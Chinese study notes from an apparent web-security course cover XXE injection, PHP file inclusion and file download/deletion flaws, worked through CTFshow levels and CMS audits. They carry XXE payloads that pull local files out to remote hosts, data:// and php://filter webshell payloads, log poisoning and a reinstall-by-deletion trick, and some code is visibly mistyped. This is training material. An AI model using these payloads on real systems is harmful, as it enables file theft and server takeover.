<p>XML被设计为传输和存储数据，ML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称KML External Entity Injection,即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
</blockquote>
<p><strong>XML与HTML的主要差异：</strong></p>
<blockquote>
<p>XML被设计为传输和存储数据，其焦点是数据的内容。<br>HTML被设计用来显示数据，其焦点是数据的外观。<br>HTML旨在显示信息，而XML旨在传输信息。</p>
</blockquote>
<h4 id="XXE修复防卸方案："><a href="#XXE修复防卸方案：" class="headerlink" title="XXE修复防卸方案："></a>XXE修复防卸方案：</h4><p>-方案1-禁用外部实体</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">libxml disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf</span><br><span class="line">=DocumentBuilderFactory.newlnstance（）:dbf.setExpandEntityReferences(false).</span><br><span class="line">Python:</span><br><span class="line"><span class="keyword">from</span> Ixml <span class="keyword">import</span> etreexmlData</span><br><span class="line">etree.parse(xmiSource,etree.XMLParser(resolve entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>

<p>-方案2-过滤用户提交的XML数据</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词：&lt;IDOCTYPE和&lt;IENTITY,或者SYSTEM和PUBLIC</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/5782d6c9d75646441930bebec4b15949.png" alt="img"></p>
<h4 id="演示案例：-18"><a href="#演示案例：-18" class="headerlink" title="演示案例："></a>演示案例：</h4><p>XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等<br>XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用<br>XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计</p>
<h4 id="XML-XXE黑盒-原理-探针-利用-玩法等"><a href="#XML-XXE黑盒-原理-探针-利用-玩法等" class="headerlink" title="#XML&amp;XXE黑盒-原理&amp;探针&amp;利用&amp;玩法等"></a>#XML&amp;XXE黑盒-原理&amp;探针&amp;利用&amp;玩法等</h4><blockquote>
<p>思路：本地靶场抓包发现post提交的参数中格式为xml格式且content-type为application&#x2F;xml判定为xml–修改数据包尝试读取文件内容–此时若无回显尝试进行数据外带发现能够实现–引用外部实体evil2.dtd文件进行读取（此时若无回显也无法实现）–最后利用外带和引用外部实体先读取这个e.txt，读取到的信息复制给变量file。然后引用外部实体test.dtd，然后外部实体里面写上用get.php这个文件的file参数去接收上面的变量file的内容。那么最后我们读取到的内容就会在file.txt这个文本文档中显示</p>
</blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyzp/11413335.html">https://www.cnblogs.com/20175211lyzp/11413335.html</a></p>
<p>1、读取文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">Mikasa</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">test</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">usemname</span>&gt;</span>&amp;test<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.1带外测试：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">9v57ll.dnslog.cn</span>&quot;&gt;</span></span><br><span class="line">%file;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、外部引用实体dtd:<br>实体引用：引用远程的evil2.dtd文件<br>1、解决拦截防护绕过问题<br>2、解决数据不回显问题</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">127.0.0.1:8081</span>/<span class="attr">evil2.dtd</span>&quot;&gt;</span></span><br><span class="line">%file,</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">evil2.dtd   读取e.txt文件</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、无回显读文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">ANY</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.tct</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">remote</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">testdtd</span>&quot;&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">test.dtd</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> % <span class="attr">all</span> &quot;&lt;<span class="attr">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &#x27;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">get.php</span>?<span class="attr">file</span>=<span class="string">%file;</span>&#x27;&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="XML-XXE-前端-CTF-Jarvisoj-探针-利用"><a href="#XML-XXE-前端-CTF-Jarvisoj-探针-利用" class="headerlink" title="#XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用"></a>#XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用</h4><p>思路：通过前端代码发现参数的传递是通过xml实现的，此时抓包构造数据包尝试进行文件读取报错是因为文件类型为json修改为xml后返回正确<br><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a><br>XXE黑盒发现：<br>1、获取得到Content-Type或数据类型为Xml时，尝试进行xml语言payload进行测试<br>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提文测试xxe<br>流程：功能分析-前端提文-源码&amp;抓包构造Paylod测试<br>更改清求据格式：Content-Type</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0?&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!DOCTYPE ANY I</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!ENTITY f SYSTEM&quot;</span> file:///home/ctf/fiao.txt&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta">&lt;x&gt;&amp;&lt;/x&gt;</span></span><br></pre></td></tr></table></figure>

<p>#XML&amp;XOXE-白盒-CMS&amp;PHPSHE&amp;无回显审计<br>思路：通过全局搜索xml解析函数逐步找到存在漏洞的函数和文件–抓包改包测试若外带出数据则证明漏洞存在<br>审计流程：<br>1、漏洞函数simplexml_load_string<br>2、pe_getxml函数调用了漏洞函数<br>3、wechat_getxmli谓用了pe_getxml<br>4、notify_urtg用了wechat_getxml<br>漏洞函数在自定义函数be getxmlg里面-&gt;谁调用了pe_getxml–&gt;wechat_getxml–找到并访问存在漏洞的文件<br>访问notify_url文件触发wechat_getxmlE函数，构造Paylod测试<br>先尝试读取文件，无回显后带外测试：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">1uwlwv.dnslog.cn</span>&quot;&gt;</span></span><br><span class="line">%file.</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后带外传递数据解决无回显：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">ANY</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">remote</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">testdtd</span>&quot;&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send:<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">testdtd:</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">all</span> &quot;&lt;<span class="attr">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &#x27;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">get.php</span>?<span class="attr">file</span>=<span class="string">%file;</span>&#x27;&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>

<h1 id="第42天：WEB攻防-通用漏洞-文件包含-LFI-RFI-伪协议编码算法-代码审计"><a href="#第42天：WEB攻防-通用漏洞-文件包含-LFI-RFI-伪协议编码算法-代码审计" class="headerlink" title="第42天：WEB攻防-通用漏洞&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计"></a>第42天：WEB攻防-通用漏洞&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计</h1><h4 id="知识点：-22"><a href="#知识点：-22" class="headerlink" title="知识点："></a>知识点：</h4><p>1、解释什么是文件包含<br>2、分类-本地LF月&amp;远程RFI<br>3、利用-配合上传&amp;日志&amp;会话<br>4、利用-伪协议&amp;编码&amp;算法等</p>
<h4 id="核心知识："><a href="#核心知识：" class="headerlink" title="#核心知识："></a>#核心知识：</h4><p>1、本地包含LF1&amp;远程包含RF1-区别<br>一个只能包含本地，一个可以远程加载<br>具体形成原因由代码和环境<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">配置文件</a>决定<br>2、各类<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">脚本语言</a>包含代码写法-见下文</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=<span class="string">&quot;1.asp&quot;</span>--&gt;</span><br><span class="line">&lt;!--#include file=<span class="string">&quot;top.aspx&quot;</span>-&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">c:import</span> <span class="attr">url</span>=<span class="string">&quot;http://thief.one/1.jsp&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">jsp:include</span> <span class="attr">page</span>=<span class="string">&quot;head.jsp&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%@include file=&quot;head.jsp&quot;%&gt;</span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?php include(test.php&#x27;)?</span></span></span><br></pre></td></tr></table></figure>

<p>3、PHP文件包含伪协议玩法</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
<h4 id="思路要点："><a href="#思路要点：" class="headerlink" title="#思路要点："></a>#思路要点：</h4><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">黑盒发现：主要观察参数传递的数据和文件名是否对应</span><br><span class="line">-白盒发现： 1、可通过应用功能追踪代码定位审计</span><br><span class="line">2、可通过却本特定函数搜索定位审计</span><br><span class="line">3、可通过伪协议玩法绕过相关修复等</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="本课总结："><a href="#本课总结：" class="headerlink" title="#本课总结："></a>#本课总结：</h4><p>1、有可控文件如能上传文件，配合上传后包含<br>2、无可控文件可以利用日志或Session&amp;伪协议<br>3、代码国定目录及文件后缀时需考虑版本绕过<br>4、伪协议玩法是建立在代码中只有变量存在时</p>
<h4 id="演示案例：-19"><a href="#演示案例：-19" class="headerlink" title="演示案例："></a>演示案例：</h4><p>前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复<br>CTF应用-CTFSHOW-78关卡到117关卡<br>CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</p>
<h4 id="前置知识-原理-分类-探针-利用-修复"><a href="#前置知识-原理-分类-探针-利用-修复" class="headerlink" title="#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复"></a>#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</h4><p>比如说1.php写入phpinfo(); 然后2.txt写入 include(‘1.txt’);那么在访问2.php时就会返回1.php中的内容，同样过滤也是，只需要先将过滤的函数定义好，然后在需要过滤的地方直接include，相当于引用。包含即执行，php文件中包含txt文件，也会以php执行。</p>
<blockquote>
<p>接下来就是一些ctfshow的刷题记录，ctfshow上的文件包含还是讲的很详细的，这里就不过多介绍了。</p>
</blockquote>
<h4 id="CTF应用-CTFSHOW-78关卡到117关卡"><a href="#CTF应用-CTFSHOW-78关卡到117关卡" class="headerlink" title="#CTF应用-CTFSHOW-78关卡到117关卡"></a>#CTF应用-CTFSHOW-78关卡到117关卡</h4><p>PHP伪协议参考链接：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
<h6 id="78-php-http协议"><a href="#78-php-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">payload:?file=php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);? payload:?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">思路：观察网站并不存在上传点，只有传参处–尝试直接读取flag.php(?file=flag.php)并无返回结果，然后尝试使用伪协议 (php://input 使用post提交数据)–再使用php system执行读取当前路径文件ls–读取文件内容tac</span><br></pre></td></tr></table></figure>

<h6 id="79-data-http协议"><a href="#79-data-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=data://text/plain.&lt;?=system(tac flag.&quot;)?&gt;I</span><br><span class="line">payload</span><br><span class="line">?file=data://text/plain:base64.PD9waHAgc3lzdGVtKCdoYWMgZmxhZy5waHAnKTs/Pg==</span><br><span class="line">payload:?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">思路：有前端JS可知此处过滤了php字符，所以可以使用data、http远程包含绕过</span><br></pre></td></tr></table></figure>

<h6 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、利用其他协议如fle,zib等</span><br><span class="line">2、利用日志记录UA特性包含执行</span><br><span class="line">分忻需文件名及带有php关键字放弃</span><br><span class="line">故利用日志记录UA信息，UA带入代码</span><br><span class="line">包含：var/log/nginx/access.log</span><br><span class="line">思路：有JS代码可以此处过滤了PHP和DATA协议，尝试使用http远程包含也没有返回结果说明网站关闭了远程文件包含</span><br><span class="line"></span><br><span class="line">后续只能使用zip和 file协议 但是两者都需要知道文件的绝对路径，通过信息收集知道中间件为nginx，尝试读取日志文件，/var/log/nginx/acess.log,读取成功尝试通过修改UA信息写入读取当前路径文件(&lt;?php system(&#x27;ls&#x27;);?&gt;)–读取flag(&lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;)</span><br></pre></td></tr></table></figure>

<h6 id="81关-增加过滤了-仍可以使用日志文件绕过"><a href="#81关-增加过滤了-仍可以使用日志文件绕过" class="headerlink" title="81关 增加过滤了 : 仍可以使用日志文件绕过"></a>81关 增加过滤了 : 仍可以使用日志文件绕过</h6><h6 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/Interpreter/p/14086164.html</span><br><span class="line">https://www.cnblogs.com/echoDetected/p/13976405.html</span><br></pre></td></tr></table></figure>

<h6 id="87-php-filter-write-加密编码"><a href="#87-php-filter-write-加密编码" class="headerlink" title="87-php:&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;filter&#x2F;write&amp;加密编码</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、利用base64</span><br><span class="line">ur编a码2次：php/filter/write=convert.base64-decode/resource=123.php</span><br><span class="line">content=aaPD9waHAgQGV2YWwOJF9QT1NUW2FdKTs/Pg==</span><br><span class="line">2、利用凯撒13:</span><br><span class="line">ur编码2次：php:/filter/write=string.rot13/resource=2.php</span><br><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp s*.cuc&#x27;):?&gt;  </span><br></pre></td></tr></table></figure>

<p>思路：增加了 “.” 过滤，致使不能直接使用日志,所以使用编码绕过，这里使用php写入参数，然后传参出写入后门代码读取</p>
<h6 id="88-data-base64协议"><a href="#88-data-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h6><p>过滤PHP,各种符号，php代码编码写出无符号base64值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdoYWMgKi5waHAnKTtlY2hvIDEyMz</span><br><span class="line">s/PmFK</span><br></pre></td></tr></table></figure>

<p>思路：此处过滤如下图，没有过滤data，尝试将data后数据进行base64编码绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.:一种过滤器，和使用iconvO☒数处理流数据有等同作用</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[a]):?&gt;)</span></span><br><span class="line"><span class="string">echo&quot;经过一次反转：&quot;$result.&quot;\n&quot;</span></span><br><span class="line"><span class="string">echo&quot;经过第二次反转：&quot;.iconv(UCS-2LE&quot;,&quot;UCS-2BE&quot;,$result):</span></span><br><span class="line"><span class="string">？&gt;</span></span><br><span class="line"><span class="string">Payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line"><span class="string">contents=?&lt;hp pvelas(P_SO【】a,)&gt;?</span></span><br></pre></td></tr></table></figure>

<h4 id="CMS源码-XHCMS-代码审计-日志-绕过"><a href="#CMS源码-XHCMS-代码审计-日志-绕过" class="headerlink" title="#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过"></a>#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</h4><p>1、搜索特定函数寻包含点<br>2、国定目录及后缀名需绕过<br>3、由CMS无上传用日志包含<br>4、利用长度绕过后缀名固定</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http://172.16.11.27/xhcms/?r=../../../nginx/logs/error.log...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>

<p>-白盒发现：</p>
<p>1、可通过应用功能追踪代码定位审计</p>
<p>2、可通过脚本特定函数搜索定位审计</p>
<p>3、可通过伪协议玩法绕过相关修复等</p>
<h4 id="本课总结：-1"><a href="#本课总结：-1" class="headerlink" title="#本课总结："></a>#本课总结：</h4><p>1、有可控文件如能上传文件，配合上传后包含</p>
<p>2、无可控文件可以利用日志或Session&amp;伪协议</p>
<p>3、代码固定目录及文件后缀时需考虑版本绕过</p>
<p>4、伪协议玩法是建立在代码中只有变量存在时</p>
<h1 id="第43天：WEB攻防-通用漏洞-任意文件下载-删除重装-敏感读取-黑白审计"><a href="#第43天：WEB攻防-通用漏洞-任意文件下载-删除重装-敏感读取-黑白审计" class="headerlink" title="第43天：WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计"></a>第43天：WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计</h1><h4 id="知识点：-23"><a href="#知识点：-23" class="headerlink" title="知识点："></a>知识点：</h4><p>1、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C&spm=1001.2101.3001.7020">文件操作</a>类安全问题<br>2、文件下载&amp;册除&amp;读取<br>3、白盒&amp;黑盒&amp;探针分析</p>
<h4 id="详细点：-8"><a href="#详细点：-8" class="headerlink" title="#详细点："></a>#详细点：</h4><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&spm=1001.2101.3001.7020">文件读取</a>：基本和文件下载利用类似<br>文件下载：利用下载获取源码或数据库配置文件及系统敏感文件为后续出思路<br>文件删除：除自身安全引发的文件除外，可配合删除重装锁定文件进行重装</p>
<h4 id="演示案例：-20"><a href="#演示案例：-20" class="headerlink" title="演示案例："></a>演示案例：</h4><p><strong>审计分析-文件下载XHCMS-功能点</strong></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/589245286">https://zhuanlan.zhihu.com/p/589245286</a></p>
<p>思路：通过访问链接找寻文件内容逐步得知下载变量在函数传递的路径–全局搜索update inset变量找寻文件上传点–访问上传点尝试构造下载内容–访问下载链接成功</p>
<p><strong>审计分析-文件读取-Metlnfo-.函数搜索</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132601103">https://blog.csdn.net/ZhaoSong_/article/details/132601103</a></p>
<p><strong>审计分析-文件删除74CMS-函数搜索</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2023/03/26/cms%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0,%E8%AE%B0%E5%BD%95/#title-2">https://blog.xmcve.com/2023/03/26/cms%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0,%E8%AE%B0%E5%BD%95/#title-2</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/755bc63622561d92fa1c9ad2a5c7795c--c69c--image-20240408163202959.png" alt="image-20240408163202959"></p>
<p>找到漏洞处，然后选择去删除重装文件</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/66393751a8de0328edac9bcaadad6294--9492--image-20240408163401656.png" alt="image-20240408163401656"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/52659ecc6bacdd0f317d4bee44f90b4e--5e82--image-20240408163812708.png" alt="image-20240408163812708"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里有点要注意，需要从admin目录下直接访问这里才能跳过csrf的监测</span><br></pre></td></tr></table></figure>

<p>思路：通过函数找到文件删除点，然后找到文件添加出通过删除函数传参删除install文件致使网站进行重新配置–可将网站数据库连接到本地。</p>
